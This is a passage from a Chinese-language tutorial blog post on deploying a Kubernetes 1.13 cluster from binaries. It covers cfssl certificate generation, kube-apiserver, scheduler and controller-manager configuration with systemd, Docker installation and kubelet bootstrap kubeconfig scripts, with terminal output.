server-csr.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;CN&quot;: &quot;kubernetes&quot;,</span><br><span class="line">    &quot;hosts&quot;: [</span><br><span class="line">      &quot;10.254.0.1&quot;,</span><br><span class="line">      &quot;127.0.0.1&quot;,</span><br><span class="line">      &quot;10.2.8.44&quot;,</span><br><span class="line">      &quot;10.2.8.65&quot;,</span><br><span class="line">      &quot;10.2.8.34&quot;,</span><br><span class="line">      &quot;kubernetes&quot;,</span><br><span class="line">      &quot;kubernetes.default&quot;,</span><br><span class="line">      &quot;kubernetes.default.svc&quot;,</span><br><span class="line">      &quot;kubernetes.default.svc.cluster&quot;,</span><br><span class="line">      &quot;kubernetes.default.svc.cluster.local&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;key&quot;: &#123;</span><br><span class="line">        &quot;algo&quot;: &quot;rsa&quot;,</span><br><span class="line">        &quot;size&quot;: 2048</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;names&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;C&quot;: &quot;CN&quot;,</span><br><span class="line">            &quot;L&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;ST&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;O&quot;: &quot;k8s&quot;,</span><br><span class="line">            &quot;OU&quot;: &quot;System&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes server-csr.json | cfssljson -bare server</span><br><span class="line">[root@elasticsearch01 ssl]# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes server-csr.json | cfssljson -bare server</span><br><span class="line">2018/12/27 09:51:56 [INFO] generate received request</span><br><span class="line">2018/12/27 09:51:56 [INFO] received CSR</span><br><span class="line">2018/12/27 09:51:56 [INFO] generating key: rsa-2048</span><br><span class="line">2018/12/27 09:51:56 [INFO] encoded CSR</span><br><span class="line">2018/12/27 09:51:56 [INFO] signed certificate with serial number 399376216731194654868387199081648887334508501005</span><br><span class="line">2018/12/27 09:51:56 [WARNING] This certificate lacks a &quot;hosts&quot; field. This makes it unsuitable for</span><br><span class="line">websites. For more information see the Baseline Requirements for the Issuance and Management</span><br><span class="line">of Publicly-Trusted Certificates, v.1.1.6, from the CA/Browser Forum (https://cabforum.org);</span><br><span class="line">specifically, section 10.2.3 (&quot;Information Requirements&quot;).</span><br><span class="line">[root@elasticsearch01 ssl]# ls</span><br><span class="line">ca-config.json  ca.csr  ca-csr.json  ca-key.pem  ca.pem  server.csr  server-csr.json  server-key.pem  server.pem</span><br></pre></td></tr></table></figure>

<p>3）制作kube-proxy证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee kube-proxy-csr.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;CN&quot;: &quot;system:kube-proxy&quot;,</span><br><span class="line">  &quot;hosts&quot;: [],</span><br><span class="line">  &quot;key&quot;: &#123;</span><br><span class="line">    &quot;algo&quot;: &quot;rsa&quot;,</span><br><span class="line">    &quot;size&quot;: 2048</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;names&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;C&quot;: &quot;CN&quot;,</span><br><span class="line">      &quot;L&quot;: &quot;Beijing&quot;,</span><br><span class="line">      &quot;ST&quot;: &quot;Beijing&quot;,</span><br><span class="line">      &quot;O&quot;: &quot;k8s&quot;,</span><br><span class="line">      &quot;OU&quot;: &quot;System&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kube-proxy-csr.json | cfssljson -bare kube-proxy</span><br><span class="line">[root@elasticsearch01 ssl]# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kube-proxy-csr.json | cfssljson -bare kube-proxy</span><br><span class="line">2018/12/27 09:52:40 [INFO] generate received request</span><br><span class="line">2018/12/27 09:52:40 [INFO] received CSR</span><br><span class="line">2018/12/27 09:52:40 [INFO] generating key: rsa-2048</span><br><span class="line">2018/12/27 09:52:40 [INFO] encoded CSR</span><br><span class="line">2018/12/27 09:52:40 [INFO] signed certificate with serial number 633932731787505365511506755558794469389165123417</span><br><span class="line">2018/12/27 09:52:40 [WARNING] This certificate lacks a &quot;hosts&quot; field. This makes it unsuitable for</span><br><span class="line">websites. For more information see the Baseline Requirements for the Issuance and Management</span><br><span class="line">of Publicly-Trusted Certificates, v.1.1.6, from the CA/Browser Forum (https://cabforum.org);</span><br><span class="line">specifically, section 10.2.3 (&quot;Information Requirements&quot;).</span><br><span class="line">[root@elasticsearch01 ssl]# ls</span><br><span class="line">ca-config.json  ca-csr.json  ca.pem          kube-proxy-csr.json  kube-proxy.pem  server-csr.json  server.pem</span><br><span class="line">ca.csr          ca-key.pem   kube-proxy.csr  kube-proxy-key.pem   server.csr      server-key.pem</span><br></pre></td></tr></table></figure>

<h5 id="4-6部署kubernetes-server"><a href="#4-6部署kubernetes-server" class="headerlink" title="4.6部署kubernetes server"></a>4.6部署kubernetes server</h5><blockquote>
<p>kubernetes master 节点运行如下组件： kube-apiserver kube-scheduler kube-controller-manager kube-scheduler 和 kube-controller-manager 可以以集群模式运行，通过 leader 选举产生一个工作进程，其它进程处于阻塞模式，master三节点高可用模式下可用</p>
</blockquote>
<p>1）解压缩文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf kubernetes-server-linux-amd64.tar.gz </span><br><span class="line">cd kubernetes/server/bin/</span><br><span class="line">cp kube-scheduler kube-apiserver kube-controller-manager kubectl /k8s/kubernetes/bin/</span><br></pre></td></tr></table></figure>

<p>2）部署kube-apiserver组件 创建TLS Bootstrapping Token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 bin]# head -c 16 /dev/urandom | od -An -t x | tr -d &#x27; &#x27;</span><br><span class="line">f2c50331f07be89278acdaf341ff1ecc</span><br><span class="line"></span><br><span class="line">vim /k8s/kubernetes/cfg/token.csv</span><br><span class="line">f2c50331f07be89278acdaf341ff1ecc,kubelet-bootstrap,10001,&quot;system:kubelet-bootstrap&quot;</span><br></pre></td></tr></table></figure>

<p>创建Apiserver配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/kubernetes/cfg/kube-apiserver </span><br><span class="line">KUBE_APISERVER_OPTS=&quot;--logtostderr=true \</span><br><span class="line">--v=4 \</span><br><span class="line">--etcd-servers=https://10.2.8.44:2379,https://10.2.8.65:2379,https://10.2.8.34:2379 \</span><br><span class="line">--bind-address=10.2.8.44 \</span><br><span class="line">--secure-port=6443 \</span><br><span class="line">--advertise-address=10.2.8.44 \</span><br><span class="line">--allow-privileged=true \</span><br><span class="line">--service-cluster-ip-range=10.254.0.0/16 \</span><br><span class="line">--enable-admission-plugins=NamespaceLifecycle,LimitRanger,ServiceAccount,ResourceQuota,NodeRestriction \</span><br><span class="line">--authorization-mode=RBAC,Node \</span><br><span class="line">--enable-bootstrap-token-auth \</span><br><span class="line">--token-auth-file=/k8s/kubernetes/cfg/token.csv \</span><br><span class="line">--service-node-port-range=30000-50000 \</span><br><span class="line">--tls-cert-file=/k8s/kubernetes/ssl/server.pem  \</span><br><span class="line">--tls-private-key-file=/k8s/kubernetes/ssl/server-key.pem \</span><br><span class="line">--client-ca-file=/k8s/kubernetes/ssl/ca.pem \</span><br><span class="line">--service-account-key-file=/k8s/kubernetes/ssl/ca-key.pem \</span><br><span class="line">--etcd-cafile=/k8s/etcd/ssl/ca.pem \</span><br><span class="line">--etcd-certfile=/k8s/etcd/ssl/server.pem \</span><br><span class="line">--etcd-keyfile=/k8s/etcd/ssl/server-key.pem&quot;</span><br></pre></td></tr></table></figure>

<p>创建apiserver systemd文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/kube-apiserver.service </span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Kubernetes API Server</span><br><span class="line">Documentation=https://github.com/kubernetes/kubernetes</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">EnvironmentFile=-/k8s/kubernetes/cfg/kube-apiserver</span><br><span class="line">ExecStart=/k8s/kubernetes/bin/kube-apiserver $KUBE_APISERVER_OPTS</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable kube-apiserver</span><br><span class="line">systemctl start kube-apiserver</span><br><span class="line">[root@elasticsearch01 bin]# systemctl status kube-apiserver</span><br><span class="line">● kube-apiserver.service - Kubernetes API Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/kube-apiserver.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2018-12-27 14:41:22 CST; 20s ago</span><br><span class="line">     Docs: https://github.com/kubernetes/kubernetes</span><br><span class="line"> Main PID: 22060 (kube-apiserver)</span><br><span class="line">   CGroup: /system.slice/kube-apiserver.service</span><br><span class="line">           └─22060 /k8s/kubernetes/bin/kube-apiserver --logtostderr=true --v=4 --etcd-servers=https://10.2.8.44:2379,https://10.2....</span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 bin]# ps -ef |grep kube-apiserver</span><br><span class="line">root     22060     1  5 14:41 ?        00:00:14 /k8s/kubernetes/bin/kube-apiserver --logtostderr=true --v=4 --etcd-servers=https://10.2.8.44:2379,https://10.2.8.65:2379,https://10.2.8.34:2379 --bind-address=10.2.8.44 --secure-port=6443 --advertise-address=10.2.8.44 --allow-privileged=true --service-cluster-ip-range=10.254.0.0/16 --enable-admission-plugins=NamespaceLifecycle,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota,NodeRestriction --authorization-mode=RBAC,Node --enable-bootstrap-token-auth --token-auth-file=/k8s/kubernetes/cfg/token.csv --service-node-port-range=30000-50000 --tls-cert-file=/k8s/kubernetes/ssl/server.pem --tls-private-key-file=/k8s/kubernetes/ssl/server-key.pem --client-ca-file=/k8s/kubernetes/ssl/ca.pem --service-account-key-file=/k8s/kubernetes/ssl/ca-key.pem --etcd-cafile=/k8s/etcd/ssl/ca.pem --etcd-certfile=/k8s/etcd/ssl/server.pem --etcd-keyfile=/k8s/etcd/ssl/server-key.pem</span><br><span class="line">[root@elasticsearch01 bin]# netstat -tulpn |grep kube-apiserve</span><br><span class="line">tcp        0      0 10.2.8.44:6443          0.0.0.0:*               LISTEN      22060/kube-apiserve </span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      22060/kube-apiserve </span><br></pre></td></tr></table></figure>

<p>3）部署kube-scheduler组件 创建kube-scheduler配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim  /k8s/kubernetes/cfg/kube-scheduler </span><br><span class="line">KUBE_SCHEDULER_OPTS=&quot;--logtostderr=true --v=4 --master=127.0.0.1:8080 --leader-elect&quot;</span><br></pre></td></tr></table></figure>

<p>参数备注： –address：在 127.0.0.1:10251 端口接收 http &#x2F;metrics 请求；kube-scheduler 目前还不支持接收 https 请求； –kubeconfig：指定 kubeconfig 文件路径，kube-scheduler 使用它连接和验证 kube-apiserver； –leader-elect&#x3D;true：集群运行模式，启用选举功能；被选为 leader 的节点负责处理工作，其它节点为阻塞状态；</p>
<p>创建kube-scheduler systemd文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/kube-scheduler.service </span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Kubernetes Scheduler</span><br><span class="line">Documentation=https://github.com/kubernetes/kubernetes</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">EnvironmentFile=-/k8s/kubernetes/cfg/kube-scheduler</span><br><span class="line">ExecStart=/k8s/kubernetes/bin/kube-scheduler $KUBE_SCHEDULER_OPTS</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable kube-scheduler.service </span><br><span class="line">systemctl start kube-scheduler.service</span><br><span class="line">[root@elasticsearch01 bin]# systemctl status kube-scheduler.service</span><br><span class="line">● kube-scheduler.service - Kubernetes Scheduler</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/kube-scheduler.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2018-12-27 15:16:51 CST; 17s ago</span><br><span class="line">     Docs: https://github.com/kubernetes/kubernetes</span><br><span class="line"> Main PID: 29026 (kube-scheduler)</span><br><span class="line">   CGroup: /system.slice/kube-scheduler.service</span><br><span class="line">           └─29026 /k8s/kubernetes/bin/kube-scheduler --logtostderr=true --v=4 --master=127.0.0.1:8080 --leader-elect</span><br></pre></td></tr></table></figure>

<p>4）部署kube-controller-manager组件 创建kube-controller-manager配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/kubernetes/cfg/kube-controller-manager</span><br><span class="line">KUBE_CONTROLLER_MANAGER_OPTS=&quot;--logtostderr=true \</span><br><span class="line">--v=4 \</span><br><span class="line">--master=127.0.0.1:8080 \</span><br><span class="line">--leader-elect=true \</span><br><span class="line">--address=127.0.0.1 \</span><br><span class="line">--service-cluster-ip-range=10.254.0.0/16 \</span><br><span class="line">--cluster-name=kubernetes \</span><br><span class="line">--cluster-signing-cert-file=/k8s/kubernetes/ssl/ca.pem \</span><br><span class="line">--cluster-signing-key-file=/k8s/kubernetes/ssl/ca-key.pem  \</span><br><span class="line">--root-ca-file=/k8s/kubernetes/ssl/ca.pem \</span><br><span class="line">--service-account-private-key-file=/k8s/kubernetes/ssl/ca-key.pem&quot;</span><br></pre></td></tr></table></figure>

<p>创建kube-controller-manager systemd文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/kube-controller-manager.service </span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Kubernetes Controller Manager</span><br><span class="line">Documentation=https://github.com/kubernetes/kubernetes</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">EnvironmentFile=-/k8s/kubernetes/cfg/kube-controller-manager</span><br><span class="line">ExecStart=/k8s/kubernetes/bin/kube-controller-manager $KUBE_CONTROLLER_MANAGER_OPTS</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable kube-controller-manager</span><br><span class="line">systemctl start kube-controller-manager</span><br><span class="line">[root@elasticsearch01 bin]# systemctl status kube-controller-manager</span><br><span class="line">● kube-controller-manager.service - Kubernetes Controller Manager</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/kube-controller-manager.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2018-12-27 15:19:19 CST; 11s ago</span><br><span class="line">     Docs: https://github.com/kubernetes/kubernetes</span><br><span class="line"> Main PID: 29510 (kube-controller)</span><br><span class="line">   CGroup: /system.slice/kube-controller-manager.service</span><br><span class="line">           └─29510 /k8s/kubernetes/bin/kube-controller-manager --logtostderr=true --v=4 --master=127.0.0.1:8080 --leader-elect=tru..</span><br></pre></td></tr></table></figure>

<h5 id="4-7-验证kubeserver服务"><a href="#4-7-验证kubeserver服务" class="headerlink" title="4.7 验证kubeserver服务"></a>4.7 验证kubeserver服务</h5><p>设置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">PATH=/k8s/kubernetes/bin:$PATH</span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>查看master服务状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kubectl get cs,nodes</span><br><span class="line">[root@elasticsearch01 bin]# kubectl get cs,nodes</span><br><span class="line">NAME                                 STATUS    MESSAGE             ERROR</span><br><span class="line">componentstatus/controller-manager   Healthy   ok                  </span><br><span class="line">componentstatus/scheduler            Healthy   ok                  </span><br><span class="line">componentstatus/etcd-0               Healthy   &#123;&quot;health&quot;:&quot;true&quot;&#125;   </span><br><span class="line">componentstatus/etcd-1               Healthy   &#123;&quot;health&quot;:&quot;true&quot;&#125;   </span><br><span class="line">componentstatus/etcd-2               Healthy   &#123;&quot;health&quot;:&quot;true&quot;&#125;   </span><br></pre></td></tr></table></figure>

<h3 id="五、Node部署"><a href="#五、Node部署" class="headerlink" title="五、Node部署"></a><strong>五、Node部署</strong></h3><blockquote>
<p>kubernetes work 节点运行如下组件： docker<br>kubelet<br>kube-proxy<br>flannel<br>系统环境<br>CentOS Linux release 7.4.1708 (Core)<br>Docker版本<br>Server Version: 18.09.0<br>Cgroup Driver: cgroupfs</p>
</blockquote>
<h5 id="5-1-Docker环境安装"><a href="#5-1-Docker环境安装" class="headerlink" title="5.1 Docker环境安装"></a>5.1 Docker环境安装</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">yum list docker-ce --showduplicates | sort -r</span><br><span class="line">yum install docker-ce -y</span><br><span class="line">systemctl start docker &amp;&amp; systemctl enable docker</span><br></pre></td></tr></table></figure>

<h5 id="5-2-部署kubelet组件"><a href="#5-2-部署kubelet组件" class="headerlink" title="5.2 部署kubelet组件"></a>5.2 部署kubelet组件</h5><blockquote>
<p>kublet 运行在每个 worker 节点上，接收 kube-apiserver 发送的请求，管理 Pod 容器，执行交互式命令，如exec、run、logs 等; kublet 启动时自动向 kube-apiserver 注册节点信息，内置的 cadvisor 统计和监控节点的资源使用情况; 为确保安全，只开启接收 https 请求的安全端口，对请求进行认证和授权，拒绝未授权的访问(如apiserver、heapster)</p>
</blockquote>
<p>1）安装二进制文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.k8s.io/v1.13.1/kubernetes-node-linux-amd64.tar.gz</span><br><span class="line">tar zxvf kubernetes-node-linux-amd64.tar.gz</span><br><span class="line">cd kubernetes/node/bin/</span><br><span class="line">cp kube-proxy kubelet kubectl /k8s/kubernetes/bin/</span><br></pre></td></tr></table></figure>

<p>2）复制相关证书到node节点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ssl]# scp *.pem 10.2.8.65:$PWD</span><br><span class="line">root@10.2.8.65&#x27;s password: </span><br><span class="line">ca-key.pem                                                                                         100% 1679   914.6KB/s   00:00    </span><br><span class="line">ca.pem                                                                                             100% 1359     1.0MB/s   00:00    </span><br><span class="line">kube-proxy-key.pem                                                                                 100% 1675     1.2MB/s   00:00    </span><br><span class="line">kube-proxy.pem                                                                                     100% 1403     1.1MB/s   00:00    </span><br><span class="line">server-key.pem                                                                                     100% 1679   809.1KB/s   00:00    </span><br><span class="line">server.pem     </span><br></pre></td></tr></table></figure>

<p>3）创建kubelet bootstrap kubeconfig文件 通过脚本实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">vim /k8s/kubernetes/cfg/environment.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">#创建kubelet bootstrapping kubeconfig </span><br><span class="line">BOOTSTRAP_TOKEN=f2c50331f07be89278acdaf341ff1ecc</span><br><span class="line">KUBE_APISERVER=&quot;https://10.2.8.44:6443&quot;</span><br><span class="line">#设置集群参数</span><br><span class="line">kubectl config set-cluster kubernetes \</span><br><span class="line">  --certificate-authority=/k8s/kubernetes/ssl/ca.pem \</span><br><span class="line">  --embed-certs=true \</span><br><span class="line">  --server=$&#123;KUBE_APISERVER&#125; \</span><br><span class="line">  --kubeconfig=bootstrap.kubeconfig</span><br><span class="line"></span><br><span class="line">#设置客户端认证参数</span><br><span class="line">kubectl config set-credentials kubelet-bootstrap \</span><br><span class="line">  --token=$&#123;BOOTSTRAP_TOKEN&#125; \</span><br><span class="line">  --kubeconfig=bootstrap.kubeconfig</span><br><span class="line"></span><br><span class="line"># 设置上下文参数</span><br><span class="line">kubectl config set-context default \</span><br><span class="line">  --cluster=kubernetes \</span><br><span class="line">  --user=kubelet-bootstrap \</span><br><span class="line">  --kubeconfig=bootstrap.kubeconfig</span><br><span class="line"></span><br><span class="line"># 设置默认上下文</span><br><span class="line">kubectl config use-context default --kubeconfig=bootstrap.kubeconfig</span><br><span class="line"></span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line"># 创建kube-proxy kubeconfig文件</span><br><span class="line"></span><br><span class="line">kubectl config set-cluster kubernetes \</span><br><span class="line">  --certificate-authority=/k8s/kubernetes/ssl/ca.pem \</span><br><span class="line">  --embed-certs=true \</span><br><span class="line">  --server=$&#123;KUBE_APISERVER&#125; \</span><br><span class="line">  --kubeconfig=kube-proxy.kubeconfig</span><br><span class="line"></span><br><span class="line">kubectl config set-credentials kube-proxy \</span><br><span class="line">  --client-certificate=/k8s/kubernetes/ssl/kube-proxy.pem \</span><br><span class="line">  --client-key=/k8s/kubernetes/ssl/kube-proxy-key.pem \</span><br><span class="line">  --embed-certs=true \</span><br><span class="line">  --kubeconfig=kube-proxy.kubeconfig</span><br><span class="line"></span><br><span class="line">kubectl config set-context default \</span><br><span class="line">  --cluster=kubernetes \</span><br><span class="line">  --user=kube-proxy \</span><br><span class="line">  --kubeconfig=kube-proxy.kubeconfig</span><br><span class="line"></span><br><span class="line">kubectl config use-context default --kubeconfig=kube-proxy.kubeconfig</span><br></pre></td></tr></table></figure>

<p>执行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch02 cfg]# sh environment.sh </span><br><span class="line">Cluster &quot;kubernetes&quot; set.</span><br><span class="line">User &quot;kubelet-bootstrap&quot; set.</span><br><span class="line">Context &quot;default&quot; created.</span><br><span class="line">Switched to context &quot;default&quot;.</span><br><span class="line">Cluster &quot;kubernetes&quot; set.</span><br><span class="line">User &quot;kube-proxy&quot; set.</span><br><span class="line">Context &quot;default&quot; created.</span><br><span class="line">Switched to context &quot;default&quot;.</span><br><span class="line">[root@elasticsearch02 cfg]# ls</span><br><span class="line">bootstrap.kubeconfig  environment.sh  kube-proxy.kubeconfig</span><br></pre></td></tr></table></figure>

<p>4）创建kubelet参数配置模板文件</p>
